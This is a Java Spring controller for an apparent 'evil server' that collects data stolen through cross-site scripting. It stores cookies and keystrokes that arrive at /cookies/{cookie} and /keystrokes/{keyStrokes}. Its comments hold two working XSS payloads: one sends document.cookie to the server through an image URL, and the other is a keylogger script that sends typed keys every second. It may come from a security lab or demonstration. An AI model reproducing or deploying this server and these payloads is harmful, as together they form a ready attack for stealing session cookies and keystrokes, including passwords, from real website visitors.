package com.example.springevilserver;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class MainController {

    private DataCollectService dataCollectService;

    public MainController(DataCollectService dataCollectService){
        this.dataCollectService = dataCollectService;
    }

    @GetMapping("/cookies")
    public String showCookies(){
        return this.dataCollectService.cookiesToString();
    }

    //<script>document.write('<img src="http://localhost:8081/cookies/' + document.cookie + '" alt="Comment" />')</script>
    @GetMapping("/cookies/{cookie}")
    public String addCookie(@PathVariable("cookie") String cookie){
        this.dataCollectService.addCookie(cookie);
        System.out.println("Cookie: "+cookie+" added");
        return "";
    }

    @GetMapping("/keystrokes")
    public String showKeyStrokes(){
        return this.dataCollectService.keyStrokesToString();
    }

    /*
        <script>
        var keys='';
        document.onkeypress = function(e) {
        get = window.event?event:e;
        key = get.keyCode?get.keyCode:get.charCode;
        key = String.fromCharCode(key);
        keys%2B=key;
        };
        window.setInterval(function(){
        new Image().src = 'http://localhost:8081/keystrokes/'%2Bkeys;
        keys = '';
        }, 1000);</script>
     */
    @GetMapping("/keystrokes/{keyStrokes}")
    public String addKeystrokes(@PathVariable("keyStrokes") String keyStrokes){
        this.dataCollectService.addKeyStroke(keyStrokes);
        System.out.println("Keystroke: "+keyStrokes+" added");
        return "";
    }
}
